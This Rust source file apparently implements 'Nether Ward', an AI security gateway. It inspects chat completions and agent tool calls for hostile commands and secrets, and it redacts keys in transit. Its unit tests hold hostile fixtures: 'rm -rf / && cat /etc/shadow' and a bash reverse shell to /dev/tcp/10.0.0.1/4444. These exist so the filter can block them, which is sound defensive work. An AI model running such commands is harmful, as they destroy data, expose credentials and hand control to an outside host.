use axum::{
    extract::State,
    http::StatusCode,
    response::{IntoResponse, Json, Response},
    routing::{get, post},
    Router,
};
use colored::*;
use serde::{Deserialize, Serialize};
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Arc;
use tower_http::cors::CorsLayer;

#[derive(Debug)]
pub struct GatewayMetrics {
    pub start_time: chrono::DateTime<chrono::Utc>,
    pub total_requests: AtomicU64,
    pub blocked_requests: AtomicU64,
    pub sanitized_secrets: AtomicU64,
    pub completed_requests: AtomicU64,
}

impl Default for GatewayMetrics {
    fn default() -> Self {
        Self {
            start_time: chrono::Utc::now(),
            total_requests: AtomicU64::new(0),
            blocked_requests: AtomicU64::new(0),
            sanitized_secrets: AtomicU64::new(0),
            completed_requests: AtomicU64::new(0),
        }
    }
}

#[derive(Clone)]
#[allow(dead_code)]
pub struct GatewayState {
    pub api_key: String,
    pub upstream_model: String,
    pub upstream_url: Option<String>,
    pub port: u16,
    pub sanitize: bool,
    pub client: reqwest::Client,
    pub metrics: Arc<GatewayMetrics>,
}

#[derive(Debug, Deserialize, Serialize, Clone)]
pub struct ChatCompletionRequest {
    pub model: Option<String>,
    pub messages: Vec<ChatMessage>,
    #[serde(default)]
    pub tools: Option<Vec<serde_json::Value>>,
    #[serde(default)]
    pub tool_choice: Option<serde_json::Value>,
    pub temperature: Option<f32>,
    pub max_tokens: Option<u32>,
    #[serde(default)]
    pub stream: Option<bool>,
}

#[derive(Debug, Deserialize, Serialize, Clone, Default)]
pub struct ChatMessage {
    pub role: String,
    #[serde(default)]
    pub content: Option<String>,
    #[serde(default)]
    pub name: Option<String>,
    #[serde(default)]
    pub tool_calls: Option<Vec<ToolCall>>,
    #[serde(default)]
    pub tool_call_id: Option<String>,
}

#[derive(Debug, Deserialize, Serialize, Clone)]
pub struct ToolCall {
    pub id: String,
    #[serde(rename = "type")]
    pub tool_type: String,
    pub function: FunctionCall,
}

#[derive(Debug, Deserialize, Serialize, Clone)]
pub struct FunctionCall {
    pub name: String,
    pub arguments: String,
}

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct ChatCompletionResponse {
    pub id: String,
    pub object: String,
    pub created: u64,
    pub model: String,
    pub choices: Vec<ChatChoice>,
}

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct ChatChoice {
    pub index: usize,
    pub message: ChatMessage,
    pub finish_reason: String,
}

/// Inspect plain text payload against threat heuristics and SAST rules
pub fn inspect_text(text: &str) -> Result<(), (StatusCode, Json<serde_json::Value>)> {
    if text.is_empty() {
        return Ok(());
    }

    // 1. Threat heuristics (entropy, shellcode, destructive command strings)
    let threat_rep = crate::threat::analyze_payload(text.as_bytes());
    if threat_rep.severity == crate::threat::ThreatSeverity::Critical {
        return Err((
            StatusCode::FORBIDDEN,
            Json(serde_json::json!({
                "error": {
                    "message": "Nether Ward Sentinel: Request blocked by security firewall. Hostile command or injection pattern detected.",
                    "type": "security_policy_violation",
                    "code": "nether_ward_threat_blocked",
                    "indicators": threat_rep.detected_indicators,
                    "entropy": threat_rep.entropy
                }
            })),
        ));
    }

    // 2. SAST static analysis rules
    let findings = crate::sast::scan_content(text, None);
    let critical_finding = findings.into_iter().find(|f| {
        f.severity == crate::sast::SastSeverity::Critical
            || f.severity == crate::sast::SastSeverity::High
    });

    if let Some(f) = critical_finding {
        return Err((
            StatusCode::FORBIDDEN,
            Json(serde_json::json!({
                "error": {
                    "message": format!(
                        "Nether Ward Sentinel: Request blocked by security firewall. Rule violation: {} [{}]",
                        f.title, f.rule_id
                    ),
                    "type": "security_policy_violation",
                    "code": "nether_ward_sast_blocked",
                    "rule_id": f.rule_id,
                    "category": f.category.to_string(),
                    "severity": f.severity.to_string(),
                    "recommendation": f.recommendation
                }
            })),
        ));
    }

    Ok(())
}

/// Inspect an array of tool calls for hostile function arguments or credential exfiltration
#[allow(dead_code)]
pub fn inspect_tool_calls(
    tool_calls: &[ToolCall],
) -> Result<(), (StatusCode, Json<serde_json::Value>)> {
    for tc in tool_calls {
        if let Err(err) = inspect_text(&tc.function.arguments) {
            eprintln!(
                "{} Blocked hostile tool call argument in tool '{}': {}",
                "NETHER WARD SENTINEL:".red().bold(),
                tc.function.name,
                tc.function.arguments
            );
            return Err(err);
        }
    }
    Ok(())
}

/// Comprehensive firewall scan of an incoming ChatCompletionRequest with optional in-flight sanitization
pub fn scan_and_sanitize_incoming_request(
    req: &mut ChatCompletionRequest,
    sanitize: bool,
) -> Result<(), (StatusCode, Json<serde_json::Value>)> {
    for msg in &mut req.messages {
        if let Some(ref mut text) = msg.content {
            if sanitize {
                let (sanitized, _) = crate::sast::sanitize_secrets(text);
                *text = sanitized;
            }
            inspect_text(text)?;
        }
        if let Some(ref mut tool_calls) = msg.tool_calls {
            for tc in tool_calls.iter_mut() {
                if sanitize {
                    let (sanitized_args, _) = crate::sast::sanitize_secrets(&tc.function.arguments);
                    tc.function.arguments = sanitized_args;
                }
                inspect_text(&tc.function.arguments)?;
            }
        }
    }
    Ok(())
}

/// Comprehensive firewall scan of outgoing model choices and tool calls with optional in-flight sanitization
pub fn scan_and_sanitize_outgoing_response(
    resp: &mut ChatCompletionResponse,
    sanitize: bool,
) -> Result<(), (StatusCode, Json<serde_json::Value>)> {
    for choice in &mut resp.choices {
        if let Some(ref mut text) = choice.message.content {
            if sanitize {
                let (sanitized, _) = crate::sast::sanitize_secrets(text);
                *text = sanitized;
            }
            inspect_text(text)?;
        }
        if let Some(ref mut tool_calls) = choice.message.tool_calls {
            for tc in tool_calls.iter_mut() {
                if sanitize {
                    let (sanitized_args, _) = crate::sast::sanitize_secrets(&tc.function.arguments);
                    tc.function.arguments = sanitized_args;
                }
                inspect_text(&tc.function.arguments)?;
            }
        }
    }
    Ok(())
}

/// Comprehensive firewall scan of an incoming ChatCompletionRequest
#[allow(dead_code)]
pub fn scan_incoming_request(
    req: &ChatCompletionRequest,
) -> Result<(), (StatusCode, Json<serde_json::Value>)> {
    let mut cloned = req.clone();
    scan_and_sanitize_incoming_request(&mut cloned, false)
}

/// Comprehensive firewall scan of outgoing model choices and tool calls
#[allow(dead_code)]
pub fn scan_outgoing_response(
    resp: &ChatCompletionResponse,
) -> Result<(), (StatusCode, Json<serde_json::Value>)> {
    let mut cloned = resp.clone();
    scan_and_sanitize_outgoing_response(&mut cloned, false)
}

pub fn create_router(state: Arc<GatewayState>) -> Router {
    Router::new()
        .route("/health", get(health_check))
        .route("/", get(health_check))
        .route("/v1/chat/completions", post(chat_completions))
        .route("/v1/models", get(list_models))
        .route("/v1/stats", get(gateway_stats))
        .route("/metrics", get(prometheus_metrics))
        .layer(CorsLayer::permissive())
        .with_state(state)
}

pub async fn run_gateway(
    port: u16,
    upstream_model: Option<String>,
    upstream_url: Option<String>,
    sanitize: bool,
) -> Result<(), Box<dyn std::error::Error>> {
    let mut api_key = std::env::var("GEMINI_API_KEY").unwrap_or_default();
    if api_key.is_empty() {
        if let Ok(env_contents) = std::fs::read_to_string(".env") {
            for line in env_contents.lines() {
                if let Some(val) = line.strip_prefix("GEMINI_API_KEY=") {
                    api_key = val.trim_matches('"').trim_matches('\'').to_string();
                    break;
                }
            }
        }
    }

    let model = upstream_model.unwrap_or_else(|| "gemini-flash-lite-latest".to_string());
    let state = Arc::new(GatewayState {
        api_key,
        upstream_model: model.clone(),
        upstream_url: upstream_url.clone(),
        port,
        sanitize,
        client: reqwest::Client::new(),
        metrics: Arc::new(GatewayMetrics::default()),
    });

    let app = create_router(state);
    let addr = format!("0.0.0.0:{}", port);
    println!(
        "{}",
        "================================================================================".blue()
    );
    println!(
        "{}",
        "               NETHER WARD: AI SECURITY GATEWAY (RUST)                         "
            .bold()
            .cyan()
    );
    println!(
        "{}",
        "================================================================================".blue()
    );
    println!(
        "{:<24}: http://{}",
        "Listening Address".bold(),
        addr.green()
    );
    println!("{:<24}: {}", "Upstream Default".bold(), model.cyan());
    if let Some(ref up) = upstream_url {
        println!("{:<24}: {}", "Upstream Proxy".bold(), up.yellow().bold());
    } else {
        println!(
            "{:<24}: Google Gemini API (Direct)",
            "Upstream Target".bold()
        );
    }
    println!(
        "{:<24}: Active (Runtime Tool-Call Firewall & SAST Deep Inspection)",
        "Sentinel Firewall".bold()
    );
    println!(
        "{:<24}: {}",
        "Secret Sanitization".bold(),
        if sanitize {
            "Active (In-Flight Secret Redaction)".green().bold()
        } else {
            "Disabled (Strict Perimeter Blocking)".yellow()
        }
    );
    println!(
        "{}",
        "================================================================================".blue()
    );

    let listener = tokio::net::TcpListener::bind(&addr).await?;
    axum::serve(listener, app).await?;
    Ok(())
}

async fn health_check() -> impl IntoResponse {
    Json(serde_json::json!({
        "status": "healthy",
        "service": "nether-ward-gateway",
        "runtime": "pure-rust",
        "version": "0.2.0"
    }))
}

async fn list_models(State(state): State<Arc<GatewayState>>) -> impl IntoResponse {
    Json(serde_json::json!({
        "object": "list",
        "data": [
            {
                "id": state.upstream_model,
                "object": "model",
                "created": 1700000000,
                "owned_by": "nether-ward"
            }
        ]
    }))
}

async fn gateway_stats(State(state): State<Arc<GatewayState>>) -> impl IntoResponse {
    let now = chrono::Utc::now();
    let uptime = (now - state.metrics.start_time).num_seconds().max(0);
    Json(serde_json::json!({
        "service": "nether-ward-gateway",
        "version": "0.2.0",
        "uptime_seconds": uptime,
        "total_requests": state.metrics.total_requests.load(Ordering::Relaxed),
        "blocked_requests": state.metrics.blocked_requests.load(Ordering::Relaxed),
        "sanitized_secrets": state.metrics.sanitized_secrets.load(Ordering::Relaxed),
        "completed_requests": state.metrics.completed_requests.load(Ordering::Relaxed),
        "active_rules_count": crate::sast::get_default_rules().len()
    }))
}

async fn prometheus_metrics(State(state): State<Arc<GatewayState>>) -> impl IntoResponse {
    let total = state.metrics.total_requests.load(Ordering::Relaxed);
    let blocked = state.metrics.blocked_requests.load(Ordering::Relaxed);
    let sanitized = state.metrics.sanitized_secrets.load(Ordering::Relaxed);
    let completed = state.metrics.completed_requests.load(Ordering::Relaxed);

    let output = format!(
        "# HELP nether_ward_requests_total Total number of chat completion requests received\n\
         # TYPE nether_ward_requests_total counter\n\
         nether_ward_requests_total {total}\n\
         # HELP nether_ward_blocked_total Total number of requests blocked by perimeter firewall\n\
         # TYPE nether_ward_blocked_total counter\n\
         nether_ward_blocked_total {blocked}\n\
         # HELP nether_ward_sanitized_total Total number of secrets sanitized in-flight\n\
         # TYPE nether_ward_sanitized_total counter\n\
         nether_ward_sanitized_total {sanitized}\n\
         # HELP nether_ward_completed_total Total number of requests successfully completed\n\
         # TYPE nether_ward_completed_total counter\n\
         nether_ward_completed_total {completed}\n"
    );

    (
        [(
            axum::http::header::CONTENT_TYPE,
            "text/plain; version=0.0.4",
        )],
        output,
    )
}

async fn chat_completions(
    State(state): State<Arc<GatewayState>>,
    Json(mut req): Json<ChatCompletionRequest>,
) -> Response {
    state.metrics.total_requests.fetch_add(1, Ordering::Relaxed);

    // 1. Inspect incoming request via Nether Ward Sentinel Firewall and sanitize if enabled
    if let Err((status, err_json)) = scan_and_sanitize_incoming_request(&mut req, state.sanitize) {
        state
            .metrics
            .blocked_requests
            .fetch_add(1, Ordering::Relaxed);
        return (status, err_json).into_response();
    }

    let target_model = req
        .model
        .clone()
        .unwrap_or_else(|| state.upstream_model.clone());

    let is_streaming = req.stream.unwrap_or(false);

    // 2. Route request: Upstream OpenAI-compatible API, Gemini API, or Offline Local Sentinel
    if let Some(ref upstream_base) = state.upstream_url {
        let endpoint = if upstream_base.ends_with("/chat/completions") {
            upstream_base.clone()
        } else if upstream_base.ends_with('/') {
            format!("{upstream_base}chat/completions")
        } else {
            format!("{upstream_base}/chat/completions")
        };

        let mut forwarded_req = req.clone();
        forwarded_req.model = Some(target_model.clone());

        let resp = match state
            .client
            .post(&endpoint)
            .json(&forwarded_req)
            .send()
            .await
        {
            Ok(r) => r,
            Err(e) => {
                state
                    .metrics
                    .blocked_requests
                    .fetch_add(1, Ordering::Relaxed);
                return (
                    StatusCode::BAD_GATEWAY,
                    Json(serde_json::json!({
                        "error": { "message": format!("Upstream call to '{endpoint}' failed: {e}") }
                    })),
                )
                    .into_response();
            }
        };

        if !resp.status().is_success() {
            state
                .metrics
                .blocked_requests
                .fetch_add(1, Ordering::Relaxed);
            let err_text = resp.text().await.unwrap_or_default();
            return (
                StatusCode::BAD_GATEWAY,
                Json(serde_json::json!({
                    "error": { "message": format!("Upstream model error: {err_text}") }
                })),
            )
                .into_response();
        }

        if is_streaming {
            state
                .metrics
                .completed_requests
                .fetch_add(1, Ordering::Relaxed);
            let text = resp.text().await.unwrap_or_default();
            return Response::builder()
                .header(axum::http::header::CONTENT_TYPE, "text/event-stream")
                .header(axum::http::header::CACHE_CONTROL, "no-cache")
                .body(axum::body::Body::from(text))
                .unwrap_or_else(|_| StatusCode::INTERNAL_SERVER_ERROR.into_response());
        }

        let mut completion_resp: ChatCompletionResponse = match resp.json().await {
            Ok(c) => c,
            Err(e) => {
                state
                    .metrics
                    .blocked_requests
                    .fetch_add(1, Ordering::Relaxed);
                return (
                    StatusCode::BAD_GATEWAY,
                    Json(serde_json::json!({
                        "error": { "message": format!("Failed to parse upstream response JSON: {e}") }
                    })),
                )
                    .into_response();
            }
        };

        // Inspect outgoing response from upstream before releasing to client
        if let Err((status, err_json)) =
            scan_and_sanitize_outgoing_response(&mut completion_resp, state.sanitize)
        {
            state
                .metrics
                .blocked_requests
                .fetch_add(1, Ordering::Relaxed);
            return (status, err_json).into_response();
        }

        state
            .metrics
            .completed_requests
            .fetch_add(1, Ordering::Relaxed);
        Json(completion_resp).into_response()
    } else if !state.api_key.is_empty() {
        let mut contents = Vec::new();
        let mut system_instruction = None;

        for msg in &req.messages {
            let content_text = msg.content.clone().unwrap_or_default();
            if msg.role == "system" {
                system_instruction = Some(serde_json::json!({
                    "parts": [{ "text": content_text }]
                }));
            } else {
                let role = if msg.role == "assistant" {
                    "model"
                } else {
                    "user"
                };
                contents.push(serde_json::json!({
                    "role": role,
                    "parts": [{ "text": content_text }]
                }));
            }
        }

        let mut gemini_payload = serde_json::json!({
            "contents": contents,
            "generationConfig": {
                "maxOutputTokens": req.max_tokens.unwrap_or(512),
                "temperature": req.temperature.unwrap_or(0.7)
            }
        });

        if let Some(sys) = system_instruction {
            gemini_payload["system_instruction"] = sys;
        }

        let url = format!(
            "https://generativelanguage.googleapis.com/v1beta/models/{}:generateContent?key={}",
            target_model, state.api_key
        );

        let resp = match state.client.post(&url).json(&gemini_payload).send().await {
            Ok(r) => r,
            Err(e) => {
                state
                    .metrics
                    .blocked_requests
                    .fetch_add(1, Ordering::Relaxed);
                return (
                    StatusCode::BAD_GATEWAY,
                    Json(serde_json::json!({
                        "error": { "message": format!("Upstream Gemini API call failed: {e}") }
                    })),
                )
                    .into_response();
            }
        };

        if !resp.status().is_success() {
            state
                .metrics
                .blocked_requests
                .fetch_add(1, Ordering::Relaxed);
            let err_text = resp.text().await.unwrap_or_default();
            return (
                StatusCode::BAD_GATEWAY,
                Json(serde_json::json!({
                    "error": { "message": format!("Upstream Gemini error: {err_text}") }
                })),
            )
                .into_response();
        }

        let gemini_json: serde_json::Value = resp.json().await.unwrap_or_default();
        let reply_text = gemini_json["candidates"][0]["content"]["parts"][0]["text"]
            .as_str()
            .unwrap_or("")
            .to_string();

        if is_streaming {
            state
                .metrics
                .completed_requests
                .fetch_add(1, Ordering::Relaxed);
            let sse_data = format!(
                "data: {{\"id\":\"chatcmpl-{}\",\"object\":\"chat.completion.chunk\",\"created\":{},\"model\":\"{}\",\"choices\":[{{\"index\":0,\"delta\":{{\"role\":\"assistant\",\"content\":{}}},\"finish_reason\":null}}]}}\n\n\
                 data: {{\"id\":\"chatcmpl-{}\",\"object\":\"chat.completion.chunk\",\"created\":{},\"model\":\"{}\",\"choices\":[{{\"index\":0,\"delta\":{{}},\"finish_reason\":\"stop\"}}]}}\n\n\
                 data: [DONE]\n\n",
                chrono::Utc::now().timestamp_millis(),
                chrono::Utc::now().timestamp(),
                target_model,
                serde_json::to_string(&reply_text).unwrap_or_default(),
                chrono::Utc::now().timestamp_millis(),
                chrono::Utc::now().timestamp(),
                target_model
            );

            return Response::builder()
                .header(axum::http::header::CONTENT_TYPE, "text/event-stream")
                .header(axum::http::header::CACHE_CONTROL, "no-cache")
                .body(axum::body::Body::from(sse_data))
                .unwrap_or_else(|_| StatusCode::INTERNAL_SERVER_ERROR.into_response());
        }

        let mut response = ChatCompletionResponse {
            id: format!("chatcmpl-{}", chrono::Utc::now().timestamp_millis()),
            object: "chat.completion".to_string(),
            created: chrono::Utc::now().timestamp() as u64,
            model: target_model,
            choices: vec![ChatChoice {
                index: 0,
                message: ChatMessage {
                    role: "assistant".to_string(),
                    content: Some(reply_text),
                    name: None,
                    tool_calls: None,
                    tool_call_id: None,
                },
                finish_reason: "stop".to_string(),
            }],
        };

        // Inspect outgoing response before releasing to client
        if let Err((status, err_json)) =
            scan_and_sanitize_outgoing_response(&mut response, state.sanitize)
        {
            state
                .metrics
                .blocked_requests
                .fetch_add(1, Ordering::Relaxed);
            return (status, err_json).into_response();
        }

        state
            .metrics
            .completed_requests
            .fetch_add(1, Ordering::Relaxed);
        Json(response).into_response()
    } else {
        // Offline Local Sentinel Mode
        let reply_text =
            "Nether Ward Sentinel: Local offline evaluation gateway active. Security inspection verified clean payload."
                .to_string();

        if is_streaming {
            state
                .metrics
                .completed_requests
                .fetch_add(1, Ordering::Relaxed);
            let sse_data = format!(
                "data: {{\"id\":\"chatcmpl-local-{}\",\"object\":\"chat.completion.chunk\",\"created\":{},\"model\":\"{}\",\"choices\":[{{\"index\":0,\"delta\":{{\"role\":\"assistant\",\"content\":{}}},\"finish_reason\":null}}]}}\n\n\
                 data: {{\"id\":\"chatcmpl-local-{}\",\"object\":\"chat.completion.chunk\",\"created\":{},\"model\":\"{}\",\"choices\":[{{\"index\":0,\"delta\":{{}},\"finish_reason\":\"stop\"}}]}}\n\n\
                 data: [DONE]\n\n",
                chrono::Utc::now().timestamp_millis(),
                chrono::Utc::now().timestamp(),
                target_model,
                serde_json::to_string(&reply_text).unwrap_or_default(),
                chrono::Utc::now().timestamp_millis(),
                chrono::Utc::now().timestamp(),
                target_model
            );

            return Response::builder()
                .header(axum::http::header::CONTENT_TYPE, "text/event-stream")
                .header(axum::http::header::CACHE_CONTROL, "no-cache")
                .body(axum::body::Body::from(sse_data))
                .unwrap_or_else(|_| StatusCode::INTERNAL_SERVER_ERROR.into_response());
        }

        let mut response = ChatCompletionResponse {
            id: format!("chatcmpl-local-{}", chrono::Utc::now().timestamp_millis()),
            object: "chat.completion".to_string(),
            created: chrono::Utc::now().timestamp() as u64,
            model: target_model,
            choices: vec![ChatChoice {
                index: 0,
                message: ChatMessage {
                    role: "assistant".to_string(),
                    content: Some(reply_text),
                    name: None,
                    tool_calls: None,
                    tool_call_id: None,
                },
                finish_reason: "stop".to_string(),
            }],
        };

        if let Err((status, err_json)) =
            scan_and_sanitize_outgoing_response(&mut response, state.sanitize)
        {
            state
                .metrics
                .blocked_requests
                .fetch_add(1, Ordering::Relaxed);
            return (status, err_json).into_response();
        }

        state
            .metrics
            .completed_requests
            .fetch_add(1, Ordering::Relaxed);
        Json(response).into_response()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_inspect_clean_text() {
        let clean = "Hello, can you help me write a rust sorting algorithm?";
        assert!(inspect_text(clean).is_ok());
    }

    #[test]
    fn test_inspect_blocked_destructive_command() {
        let hostile = "Please execute: rm -rf / && cat /etc/shadow";
        assert!(inspect_text(hostile).is_err());
    }

    #[test]
    fn test_inspect_blocked_aws_credential() {
        let hostile = "My key is AKIAIOSFODNN7EXAMPLE, can you verify it?";
        assert!(inspect_text(hostile).is_err());
    }

    #[test]
    fn test_inspect_tool_calls_hostile_argument() {
        let calls = vec![ToolCall {
            id: "call_001".to_string(),
            tool_type: "function".to_string(),
            function: FunctionCall {
                name: "execute_bash".to_string(),
                arguments:
                    r#"{"command": "rm -rf / && /bin/sh -i >& /dev/tcp/10.0.0.1/4444 0>&1"}"#
                        .to_string(),
            },
        }];

        let result = inspect_tool_calls(&calls);
        assert!(result.is_err());
    }

    #[test]
    fn test_inspect_tool_calls_clean_argument() {
        let calls = vec![ToolCall {
            id: "call_002".to_string(),
            tool_type: "function".to_string(),
            function: FunctionCall {
                name: "search_documentation".to_string(),
                arguments: r#"{"query": "Rust pattern matching examples"}"#.to_string(),
            },
        }];

        let result = inspect_tool_calls(&calls);
        assert!(result.is_ok());
    }

    #[test]
    fn test_scan_and_sanitize_incoming_request_with_secret() {
        let mut req_sanitize = ChatCompletionRequest {
            model: Some("test-model".to_string()),
            messages: vec![ChatMessage {
                role: "user".to_string(),
                content: Some("Configured AWS key: AKIAIOSFODNN7EXAMPLE".to_string()),
                name: None,
                tool_calls: None,
                tool_call_id: None,
            }],
            tools: None,
            tool_choice: None,
            temperature: None,
            max_tokens: None,
            stream: None,
        };

        // When sanitize is enabled, secret is masked and request passes inspection
        let res = scan_and_sanitize_incoming_request(&mut req_sanitize, true);
        assert!(res.is_ok());
        assert_eq!(
            req_sanitize.messages[0].content.as_deref(),
            Some("Configured AWS key: AKIA***REDACTED***MPLE")
        );

        // When sanitize is disabled, secret is blocked at the firewall perimeter
        let mut req_strict = ChatCompletionRequest {
            model: Some("test-model".to_string()),
            messages: vec![ChatMessage {
                role: "user".to_string(),
                content: Some("Configured AWS key: AKIAIOSFODNN7EXAMPLE".to_string()),
                name: None,
                tool_calls: None,
                tool_call_id: None,
            }],
            tools: None,
            tool_choice: None,
            temperature: None,
            max_tokens: None,
            stream: None,
        };
        let res_strict = scan_and_sanitize_incoming_request(&mut req_strict, false);
        assert!(res_strict.is_err());
    }

    #[test]
    fn test_scan_and_sanitize_incoming_request_blocks_malicious_command_even_when_sanitizing() {
        let mut req = ChatCompletionRequest {
            model: Some("test-model".to_string()),
            messages: vec![ChatMessage {
                role: "user".to_string(),
                content: Some(
                    "Execute destructive command: rm -rf / && cat /etc/shadow".to_string(),
                ),
                name: None,
                tool_calls: None,
                tool_call_id: None,
            }],
            tools: None,
            tool_choice: None,
            temperature: None,
            max_tokens: None,
            stream: None,
        };

        let res = scan_and_sanitize_incoming_request(&mut req, true);
        assert!(res.is_err());
    }

    #[test]
    fn test_gateway_metrics_default() {
        let metrics = GatewayMetrics::default();
        assert_eq!(metrics.total_requests.load(Ordering::Relaxed), 0);
        metrics.total_requests.fetch_add(1, Ordering::Relaxed);
        assert_eq!(metrics.total_requests.load(Ordering::Relaxed), 1);
    }
}
